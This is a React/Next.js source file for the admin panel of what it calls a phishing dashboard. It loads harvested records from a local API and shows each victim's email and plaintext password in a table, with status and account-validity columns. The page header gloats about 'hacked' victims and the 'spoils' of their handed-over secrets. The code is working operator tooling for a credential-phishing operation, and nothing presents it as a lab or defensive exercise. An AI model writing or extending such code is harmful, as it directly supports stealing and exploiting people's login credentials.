"use client";
import React, { useEffect, useState } from 'react'
import axios from 'axios';
import Link from 'next/link';
import { BsArrowLeft } from 'react-icons/bs';

// icons
import { BsPencil } from "react-icons/bs"
function AdminPage() {
  const [users, setUsers] = useState([]);
  const [isLoaded, setIsLoaded] = useState(true);
  const fetchData = async () => {
    await axios.get("http://localhost:3000/api")
      .then(res => {
        setIsLoaded(false);
        setUsers(res.data.message);
      })
      .catch(err => console.log(err.message));
  }
  useEffect(() => {
    fetchData();
  }, []);

  return (
    <div>
      <main className='p-5 md:py-10 md:px-20'>
        <section>
          <nav className='border-b border-teal-600 pb-3 flex items-center justify-between'>
            <h1 className='text-teal-600 text-xl font-semibold'>Phishing / admin-dashboard</h1>
            <Link href="/" className='text-teal-600 text-2xl font-extrabold'><BsArrowLeft /></Link>
          </nav>
        </section>

        <section>
          <div className='pt-20 pb-10 text-center'>
            <h1 className='text-xl pb-2 md:text-2xl'>Mission Accomplished: Hacked 'Em All!</h1>
            <p className='text-sm md:text-lg font-light text-gray-800'>Behold the spoils of your digital conquest. Here’s the rundown of all the “volunteers” who handed over their secrets. Enjoy responsibly!</p>
          </div>
          {isLoaded ?
            <div className='flex min-h-52 items-center justify-center'>
              <span className='w-16 h-16 border-4 block border-teal-600 rounded-full border-r-teal-100 animate-spin'></span>
            </div>
            :
            <div className='w-full overflow-x-auto overflow-y-auto'>
              <table className='w-full text-center'>
                <thead className='bg-gray-50 py-3'>
                  <tr>
                    <th scope='col' className='px-7 py-3'>ID</th>
                    <th scope='col' className='px-7 py-3'>Email</th>
                    <th scope='col' className='px-7 py-3'>Password</th>
                    <th scope='col' className='px-7 py-3'>Status</th>
                    <th scope='col' className='px-7 py-3'>Account</th>
                    <th scope='col' className='px-7 py-3'>Edit</th>
                  </tr>
                </thead>
                <tbody className='text-center'>
                  {
                    users?.map((user, idx) => (
                      <tr key={user._id} className='border-b mb-3'>
                        <td>{idx}</td>
                        <td>{user.email}</td>
                        <td>{user.password}</td>
                        <td>
                          <div className='flex items-center justify-start gap-2 my-3 w-32 mx-auto'>
                            {
                              user.status === "pending" ? <span className='w-3 h-3 block bg-yellow-500 rounded-full'></span>
                                : user.status === "failed" ? <span className='w-3 h-3 block bg-red-500 rounded-full'></span>
                                  : <span className='w-3 h-3 block bg-green-500 rounded-full'></span>
                            }
                            <span>{user.status}</span>
                          </div>
                        </td>
                        <td>
                          <div className='flex items-center justify-start gap-2 my-3 w-32 mx-auto'>
                            {
                              user.account === "checking" ? <span className='w-3 h-3 block bg-yellow-500 rounded-full'></span>
                                : user.account === "Not existed" ? <span className='w-3 h-3 block bg-red-500 rounded-full'></span>
                                  : <span className='w-3 h-3 block bg-green-500 rounded-full'></span>
                            }
                            {user.account}
                          </div>
                        </td>
                        <td>
                          <Link href={`admin/${user._id}`} className='flex justify-center text-yellow-600'>
                            <BsPencil />
                          </Link>
                        </td>
                      </tr>
                    ))
                  }
                </tbody>
              </table>
            </div>
          }
        </section>
      </main>
    </div>
  )
}

export default AdminPage;
